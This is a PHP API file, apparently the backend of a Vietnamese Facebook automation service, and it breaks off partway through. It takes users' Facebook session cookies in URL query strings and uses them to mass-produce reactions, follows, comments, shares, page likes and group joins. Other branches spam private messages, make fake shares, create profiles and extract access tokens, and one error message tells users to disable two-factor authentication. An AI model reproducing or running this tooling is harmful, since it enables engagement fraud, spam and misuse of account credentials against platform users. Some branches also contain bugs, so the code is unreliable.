<?php
header('Content-Type: text/html; charset=utf-8');
require_once ($_SERVER['DOCUMENT_ROOT'].'/api/facebook.php');
$loai=$_GET['loai'];
if($loai=='randomnam'){
    $ten=randomhoten('nam');
    exit(json_encode(array(
        "status"=>"success",
        "message"=> $ten
        )));
}
if($loai=='randomnu'){
    $ten=randomhoten('nu');
    exit(json_encode(array(
        "status"=>"success",
        "message"=> $ten
        )));
}
$cookie=$_GET["cookie"];
if($cookie==""){
    exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
} else {
    $thongtin=thongtin($cookie);
    $thongtin=json_decode($thongtin,true);
    if(isset($thongtin['error'])){
        exit(json_encode(array(
        "status"=>"error",
        "message"=> $thongtin['error']
        )));
    }
    $_SESSION["name"]=$thongtin["name"];
    $_SESSION["id"]=$thongtin["id"];
    $_SESSION["loai"]=$thongtin["loai"];
}
if($loai==""){
    require_once ($_SERVER['DOCUMENT_ROOT'].'/404.php');
}else if($loai=="thongtin" or $loai=="THONGTIN"){
    echo (json_encode(array(
        "status"=>"success",
        "message"=> array(
                    "name"=>$_SESSION["name"],
                    "id"=>$_SESSION["id"],
                    "loai"=>$_SESSION['loai']
                    ),
        )));
} else if($loai=="like" or $loai == "LIKE"){
///LIKE
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='LIKE';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= camxuc($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Like Thành công."
            ));
    }
} else if($loai=="love" or $loai == "LOVE"){
///TYM 
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='LOVE';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= camxuc($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Tym Thành công."
            ));
    }
} else if($loai=="haha" or $loai == "HAHA"){
///HAHA
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='HAHA';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= camxuc($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Haha Thành công."
            ));
    }
} else if($loai=="care" or $loai == "CARE"){
///CARE
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='CARE';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= camxuc($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Care Thành công."
            ));
    }
} else if($loai=="wow" or $loai == "WOW"){
///WOW
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='WOW';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= camxuc($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Wow Thành công."
            ));
    }
} else if($loai=="sad" or $loai == "SAD"){
///SAD
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='SAD';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= camxuc($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Sad Thành công."
            ));
    }
} else if($loai=="angry" or $loai == "ANGRY"){
///ANGRY
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='ANGRY';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= camxuc($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Angry Thành công."
            ));
    }
} else if($loai=="likenuoi" or $loai == "LIKENUOI"){
///LIKE
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='LIKE';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= nuoifbcx($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Like Thành công."
            ));
    }
} else if($loai=="lovenuoi" or $loai == "LOVENUOI"){
///TYM 
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='LOVE';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= nuoifbcx($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Tym Thành công."
            ));
    }
} else if($loai=="hahanuoi" or $loai == "HAHANUOI"){
///HAHA
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='HAHA';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= nuoifbcx($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Haha Thành công."
            ));
    }
} else if($loai=="carenuoi" or $loai == "CARENUOI"){
///CARE
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='CARE';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= nuoifbcx($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Care Thành công."
            ));
    }
} else if($loai=="wownuoi" or $loai == "WOWNUOI"){
///WOW
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='WOW';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= nuoifbcx($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Wow Thành công."
            ));
    }
} else if($loai=="sadnuoi" or $loai == "SADNUOI"){
///SAD
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='SAD';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= nuoifbcx($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Sad Thành công."
            ));
    }
} else if($loai=="angrynuoi" or $loai == "ANGRYNUOI"){
///ANGRY
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    $type='ANGRY';
    if($id =="" or $cookie =="" or $type ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $cx= nuoifbcx($id,$type,$cookie);
    if(strpos($cx,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
            )));
    } else {
        echo json_encode(array(
            "status"=>"success",
            "message"=>"Đã Angry Thành công."
            ));
    }
} else if($loai=="follow" or $loai == "FOLLOW"){
///FOLLOW
    $id=$_GET['id'];
    $cookie=$_GET['cookie'];
    if($id =="" or $cookie ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $fl=follow($id, $cookie);
    if(strpos($fl,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    if($fl=="error"){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Follow không thành công !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Follow thành công."
    )));
} else if($loai=="huyfollow" or $loai == "HUYFOLLOW"){
    $id=$_GET["id"];
    $cookie=$_GET['cookie'];
    if($id =="" or $cookie ==""){
        exit(json_encode(array(
                "status"=>"error",
                "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
                )));
    }
    $huy=huyfollow($id,$cookie);
    if(strpos($fl,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Hủy Follow thành công."
    )));
} else if($loai=="comment" or $loai == "COMMENT"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    $noidung=$_GET["noidung"];
    if($id=="" or $cookie=="" or $noidung==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cmt=comment($id,$cookie,$noidung);
    if(strpos($cmt,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Comment thành công."
    )));
} else if($loai=="share" or $loai == "SHARE"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $share=share($id,$cookie);
    if(strpos($share,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Share thành công."
    )));
} else if($loai=="likepage" or $loai == "LIKEPAGE"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $likepage=likepage($id,$cookie);
    if(strpos($likepage,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    if($likepage=="error"){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Đã có lỗi xảy ra vui lòng thử lại sau !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Like Page thành công."
    )));
} else if($loai=="joingroup" or $loai == "JOINGROUP"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $joingroup=joingroup($id,$cookie);
    if(strpos($joingroup,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Join group thành công."
    )));
} else if($loai=="likecmt" or $loai == "LIKECMT"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    $type="LIKE";
    $idfb=json_decode(thongtin($cookie),true)["id"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cxcmt=reaction_cmt($id,$idfb,$type,$cookie);
    if(strpos($cxcmt,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    if(strpos($cxcmt,"Không thể thích đối tượng")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Like Comment thành công."
    )));
} else if($loai=="lovecmt" or $loai == "LOVECMT"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    $type="LOVE";
    $idfb=json_decode(thongtin($cookie),true)["id"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cxcmt=reaction_cmt($id,$idfb,$type,$cookie);
    if(strpos($cxcmt,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    if(strpos($cxcmt,"Không thể thích đối tượng")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Love Comment thành công."
    )));
} else if($loai=="hahacmt" or $loai == "HAHACMT"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    $type="HAHA";
    $idfb=json_decode(thongtin($cookie),true)["id"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cxcmt=reaction_cmt($id,$idfb,$type,$cookie);
    if(strpos($cxcmt,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    if(strpos($cxcmt,"Không thể thích đối tượng")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Haha Comment thành công."
    )));
} else if($loai=="carecmt" or $loai == "CARECMT"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    $type="CARE";
    $idfb=json_decode(thongtin($cookie),true)["id"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cxcmt=reaction_cmt($id,$idfb,$type,$cookie);
    if(strpos($cxcmt,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    if(strpos($cxcmt,"Không thể thích đối tượng")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Care Comment thành công."
    )));
} else if($loai=="wowcmt" or $loai == "WOWCMT"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    $type="WOW";
    $idfb=json_decode(thongtin($cookie),true)["id"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cxcmt=reaction_cmt($id,$idfb,$type,$cookie);
    if(strpos($cxcmt,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    if(strpos($cxcmt,"Không thể thích đối tượng")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Wow Comment thành công."
    )));
} else if($loai=="sadcmt" or $loai == "SADCMT"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    $type="SAD";
    $idfb=json_decode(thongtin($cookie),true)["id"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cxcmt=reaction_cmt($id,$idfb,$type,$cookie);
    if(strpos($cxcmt,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    if(strpos($cxcmt,"Không thể thích đối tượng")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Sad Comment thành công."
    )));
} else if($loai=="angrycmt" or $loai == "ANGRYCMT"){
    $id=$_GET["id"];
    $cookie=$_GET["cookie"];
    $type="";
    $idfb=json_decode(thongtin($cookie),true)["id"];
    if($id=="" or $cookie==""){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cxcmt=reaction_cmt($id,$idfb,$type,$cookie);
    if(strpos($cxcmt,"Tài khoản của bạn hiện bị hạn chế")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    if(strpos($cxcmt,"Không thể thích đối tượng")!==false){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn đã bị block !!!"
    )));
    }
    echo(json_encode(array(
        "status"=>"success",
        "message"=>"Đã Angry Comment thành công."
    )));
} else if($loai=="nuoifbadd"){
    $cookie=$_GET['cookie'];
    $nuoi=addnuoifb($cookie);
    if($nuoi=='block'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=> "Bạn đã bị block !!!"
        )));
    }
    if($nuoi=='end'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=> "Đã hết bạn bè gợi ý."
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> "Thành Công đã add ".$nuoi,
        "id"=> $nuoi
    )));
} else if($loai=='nuoifbgetpost'){
    $a=getpostnuoifb($cookie);
    if($a=='end'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=> "Đã hết bài viết !!!"
        )));
    } else if ($a==''){
        exit(json_encode(array(
            "status"=>"error",
            "message"=> "Lỗi không xác định !!!"
        )));
    } else {
        echo (json_encode(array(
            "status"=>"success",
            "message"=> $a
        )));
    }
} else if($loai=="tokenregvitri"){
    $id=$_GET['id'];
    if($id==''){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $a=gettokenpage($id,$cookie);
    if($a=='Id Page Sai !!!'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn nhập id không chính xác."
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=>$a
    )));
} else if($loai=='chocbb'){
    $choc=chocbb($cookie);
    if($choc=='end'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Đã hết lượt chọc."
        )));
    }
    echo (json_encode(array(
            "status"=>"success",
            "message"=>$choc
        )));
} else if($loai=='messages'){
    $id=$_GET['id'];
    $noidung=$_GET['noidung'];
    if($id=='' or $noidung==''){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $ib=spamib($id,$noidung,$cookie);
    if($ib=='error'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Gửi tin nhắn không thành công!."
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> "Đã gửi thành công."
    )));
} else if($loai=='regpro5'){
    $name=$_GET['noidung'];
    if($name==''){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $reg=regpr5($name,$_SESSION['id'],$cookie);
    if($reg=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Tài khoản của bạn đã bị hạn chế"
        )));
    }
    if($reg=='hanche'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Tài khoản của bạn đã bị hạn chế"
        )));
    }
        echo (json_encode(array(
            "status"=>"success",
            "message"=>array(
                        "id"=> explode('|',$reg)[0],
                        "name"=> explode('|',$reg)[1]
            ))));
} else if($loai=='addkhonggoiy'){
    $add=addtimkiem($cookie);
    if($add=="error"){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Add không thành Công"
        )));
    } else {
        echo (json_encode(array(
            "status"=>"success",
            "message"=>$add
        )));
    }
} else if($loai=='gettoken' or $loai=='GETTOKEN'){
    $tk=laytoken($cookie);
    if($tk=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=> "Bạn vui lòng tắt 2 Fa"
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> $tk
    )));
} else if($loai=='shareao'){
    $idshare=$_GET['id'];
    $token=$_GET['noidung'];
    $share=shareao($idshare,$token,$cookie);
    if($share=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Share không thành công"
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> $share
    )));
} else if($loai=='gettokenpage'){
    $get=getalltokenpage($cookie);
    echo (json_encode(array(
        "status"=>"success",
        "message"=> $get
    )));
} else if($loai=='likepro5' or $loai=='LIKEPRO5'){
    $id=$_GET['id'];
    if(!$id){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cx=cxpro5($id,'like',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    if($cx!='success'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>$cx
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cảm xúc thành công'
    )));
} else if($loai=='lovepro5' or $loai=='LOVEPRO5'){
    $id=$_GET['id'];
    if(!$id){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cx=cxpro5($id,'love',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cảm xúc thành công'
    )));
} else if($loai=='carepro5' or $loai=='CAREPRO5'){
    $id=$_GET['id'];
    if(!$id){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cx=cxpro5($id,'care',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cảm xúc thành công'
    )));
} else if($loai=='hahapro5' or $loai=='HAHAPRO5'){
    $id=$_GET['id'];
    if(!$id){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cx=cxpro5($id,'haha',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cảm xúc thành công'
    )));
} else if($loai=='wowpro5' or $loai=='WOWPRO5'){
    $id=$_GET['id'];
    if(!$id){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cx=cxpro5($id,'wow',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
        }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cảm xúc thành công'
    )));
} else if($loai=='sadpro5' or $loai=='SADPRO5'){
    $id=$_GET['id'];
    if(!$id){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cx=cxpro5($id,'sad',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cảm xúc thành công'
    )));
} else if($loai=='angrypro5' or $loai=='ANGRYPRO5'){
    $id=$_GET['id'];
    if(!$id){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $cx=cxpro5($id,'angry',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cảm xúc thành công'
    )));
} else if($loai=='followpro5' or $loai=='FOLLOWPRO5'){
    $id=$_GET['id'];
    if(!$id){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $follow=followpro5($id,$cookie);
    if($follow=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã follow '.$id.' thành công'
    )));
} else if($loai=='likepagepro5' or $loai=='LIKEPAGEPRO5'){
    $id=$_GET['id'];
    if(!$id){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>"Bạn vui lòng nhập đầy đủ thông tin !!!"
        )));
    }
    $like=likepagepro5($id,$cookie);
    if($like=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã Like '.$id.' thành công'
    )));
} else if($loai=='likecmtpro5' or $loai=='LIKECMTPRO5'){
    $id=$_GET['id'];
    $cx=cxcmtpro5($id,'like',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cx '.$id.' thành công'
    )));
} else if($loai=='lovecmtpro5' or $loai=='LOVECMTPRO5'){
    $id=$_GET['id'];
    $cx=cxcmtpro5($id,'love',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cx '.$id.' thành công'
    )));
} else if($loai=='carecmtpro5' or $loai=='CARECMTPRO5'){
    $id=$_GET['id'];
    $cx=cxcmtpro5($id,'care',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cx '.$id.' thành công'
    )));
} else if($loai=='hahacmtpro5' or $loai=='HAHACMTPRO5'){
    $id=$_GET['id'];
    $cx=cxcmtpro5($id,'haha',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
    echo (json_encode(array(
        "status"=>"success",
        "message"=> 'Đã thả cx '.$id.' thành công'
    )));
} else if($loai=='wowcmtpro5' or $loai=='WOWCMTPRO5'){
    $id=$_GET['id'];
    $cx=cxcmtpro5($id,'wow',$cookie);
    if($cx=='loi'){
        exit(json_encode(array(
            "status"=>"error",
            "message"=>'Bạn đã bị hạn chế'
        )));
    }
